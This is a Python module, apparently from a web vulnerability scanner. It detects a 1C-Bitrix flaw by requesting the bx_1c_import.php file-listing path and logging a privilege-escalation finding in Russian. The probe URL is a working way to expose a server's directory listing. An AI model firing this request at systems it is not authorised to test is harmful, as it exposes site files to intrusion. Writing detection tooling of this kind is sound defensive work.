from .client import NotAPage, RedirectedToExternal
from .compat import urljoin
from .utils import get_url_root

def attack_cms(cms, url, client, log):
    attack_func = cms_switch(cms)
    if hasattr(attack_func, '__call__'):
        attack_func(url, client, log)

def cms_switch(t):
    return {
        '1C-Bitrix': bitrix,
    }.get(t, None)

def bitrix(url, client, log):
    url_root = get_url_root(url)
    print(url_root)
    injected_url = urljoin(url_root, 'bx_1c_import.php?mode=query&action=getfiles&path=/')
    print(injected_url)
    try:
        res_page = client.get(injected_url)
    except (NotAPage, RedirectedToExternal) as e:
        return

    if res_page.document.find_all('a', {'id': 'p_minifileman_1'}):
        log('vuln', 'cms_vuln', url_root, injections=['bx_1c_import.php?mode=query&action=getfiles&path=/'], message='Необходимо пересмотреть исходный код файла bx_1c_import.php на наличие превышения привелегий', page_url=url)
